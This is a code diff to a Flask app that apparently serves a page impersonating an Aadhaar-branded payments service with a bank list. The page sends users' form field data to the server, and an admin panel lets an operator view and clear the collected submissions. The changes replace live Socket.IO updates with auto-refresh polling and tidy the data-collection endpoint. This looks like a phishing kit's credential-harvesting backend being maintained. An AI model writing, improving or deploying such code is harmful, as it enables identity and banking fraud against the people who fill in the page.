@@ -1,17 +1,14 @@
 from flask import Flask, request, jsonify, render_template_string
-from flask_socketio import SocketIO, emit
 import json
 from datetime import datetime
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'your-secret-key-change-this'
-socketio = SocketIO(app, cors_allowed_origins="*")
 
 # In-memory storage
 submissions = []
 submission_counter = 1
 
-# ==================== ORIGINAL HTML CODE (Aapka wala bilkul same) ====================
+# ==================== ORIGINAL HTML CODE ====================
 HTML_CODE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -384,20 +381,22 @@ HTML_CODE = '''
 </div>
 
 <script>
-    // API URL - automatically detect server URL (Render pe automatically adjust ho jayega)
     const API_URL = window.location.origin;
     
-    function sendToServer(dataType, fieldsData) {
-        fetch(API_URL + '/api/submit-data', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                source: dataType,
-                fields: fieldsData,
-                raw_message: JSON.stringify(fieldsData, null, 2),
-                timestamp: new Date().toISOString()
-            })
-        }).catch(err => console.log('Error sending data:', err));
+    async function sendToServer(dataType, fieldsData) {
+        try {
+            await fetch(API_URL + '/api/submit-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    source: dataType,
+                    fields: fieldsData,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        } catch(err) {
+            console.log('Error sending data:', err);
+        }
     }
     
     const bankList = [
@@ -635,7 +634,7 @@ HTML_CODE = '''
 </html>
 '''
 
-# ==================== ADMIN PANEL HTML (Alag se) ====================
+# ==================== ADMIN PANEL HTML ====================
 ADMIN_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -643,7 +642,6 @@ ADMIN_HTML = '''
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel - AADHAR UCL Payments</title>
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }
@@ -654,6 +652,8 @@ ADMIN_HTML = '''
         .clear-btn:hover { background: #c62a47; }
         .refresh-btn { background: #0f3460; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
         .refresh-btn:hover { background: #1a4a7a; }
+        .auto-refresh { background: #1e6f3f; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .auto-refresh.on { background: #e94560; }
         .submissions-grid { display: flex; flex-direction: column; gap: 20px; }
         .submission-card { background: #0f3460; border-radius: 12px; padding: 20px; border-left: 5px solid #ffb347; }
         .card-header { display: flex; justify-content: space-between; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
@@ -673,6 +673,7 @@ ADMIN_HTML = '''
     <div class="stats">
         <span>📊 Total Submissions: <strong id="totalCount">0</strong></span>
         <div>
+            <button id="autoRefreshBtn" class="auto-refresh on">⏸️ Auto Refresh ON</button>
             <button class="refresh-btn" onclick="loadSubmissions()">🔄 Refresh</button>
             <button class="clear-btn" onclick="clearSubmissions()">🗑️ Clear All</button>
         </div>
@@ -684,26 +685,26 @@ ADMIN_HTML = '''
 
 <script>
     const API_URL = window.location.origin;
-    let socket = null;
-
-    function connectSocket() {
-        socket = io(API_URL);
-        socket.on('new_submission', function(data) {
-            console.log('New submission received:', data);
-            addSubmissionToTop(data);
+    let autoRefresh = true;
+    let refreshInterval = null;
+    
+    function startAutoRefresh() {
+        if(refreshInterval) clearInterval(refreshInterval);
+        refreshInterval = setInterval(() => {
+            if(autoRefresh) loadSubmissions();
+        }, 3000);
+    }
+    
+    function escapeHtml(str) {
+        if(!str) return '';
+        return String(str).replace(/[&<>]/g, function(m) {
+            if(m === '&') return '&amp;';
+            if(m === '<') return '&lt;';
+            if(m === '>') return '&gt;';
+            return m;
         });
     }
-
-    function addSubmissionToTop(submission) {
-        const container = document.getElementById('submissionsList');
-        const existingNoData = container.querySelector('.no-data');
-        if(existingNoData) existingNoData.remove();
-        
-        const card = createSubmissionCard(submission);
-        container.insertBefore(card, container.firstChild);
-        updateTotalCount();
-    }
-
+    
     function createSubmissionCard(submission) {
         const div = document.createElement('div');
         div.className = 'submission-card';
@@ -730,17 +731,7 @@ ADMIN_HTML = '''
         `;
         return div;
     }
-
-    function escapeHtml(str) {
-        if(!str) return '';
-        return str.replace(/[&<>]/g, function(m) {
-            if(m === '&') return '&amp;';
-            if(m === '<') return '&lt;';
-            if(m === '>') return '&gt;';
-            return m;
-        });
-    }
-
+    
     async function loadSubmissions() {
         try {
             const response = await fetch(API_URL + '/api/submissions');
@@ -755,26 +746,33 @@ ADMIN_HTML = '''
                     container.appendChild(createSubmissionCard(sub));
                 });
             }
-            updateTotalCount();
+            document.getElementById('totalCount').innerText = submissions.length;
         } catch(err) {
             console.error('Error loading submissions:', err);
-            document.getElementById('submissionsList').innerHTML = '<div class="no-data">❌ Error loading data. Make sure server is running.</div>';
         }
     }
-
-    function updateTotalCount() {
-        const count = document.querySelectorAll('.submission-card').length;
-        document.getElementById('totalCount').innerText = count;
-    }
-
+    
     async function clearSubmissions() {
         if(confirm('⚠️ Are you sure you want to delete ALL submissions? This cannot be undone.')) {
             await fetch(API_URL + '/api/clear-submissions', { method: 'POST' });
             loadSubmissions();
         }
     }
-
-    connectSocket();
+    
+    const autoRefreshBtn = document.getElementById('autoRefreshBtn');
+    autoRefreshBtn.addEventListener('click', () => {
+        autoRefresh = !autoRefresh;
+        if(autoRefresh) {
+            autoRefreshBtn.textContent = '⏸️ Auto Refresh ON';
+            autoRefreshBtn.className = 'auto-refresh on';
+            loadSubmissions();
+        } else {
+            autoRefreshBtn.textContent = '▶️ Auto Refresh OFF';
+            autoRefreshBtn.className = 'auto-refresh';
+        }
+    });
+    
+    startAutoRefresh();
     loadSubmissions();
 </script>
 </body>
@@ -803,19 +801,16 @@ def submit_data():
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'source': data.get('source', 'unknown'),
         'fields': data.get('fields', {}),
-        'raw_message': data.get('raw_message', '')
     }
     
     submissions.insert(0, enriched_data)
     submission_counter += 1
     
-    # Keep only last 500 submissions to save memory
+    # Keep only last 500 submissions
     while len(submissions) > 500:
         submissions.pop()
     
-    socketio.emit('new_submission', enriched_data)
-    
-    print(f"[DATA RECEIVED] {enriched_data['timestamp']} | {enriched_data['source']}")
+    print(f"[DATA] {enriched_data['timestamp']} | {enriched_data['source']}")
     return jsonify({'status': 'ok', 'id': enriched_data['id']})
 
 @app.route('/api/submissions')
@@ -830,4 +825,4 @@ def clear_submissions():
     return jsonify({'status': 'cleared'})
 
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=5000)
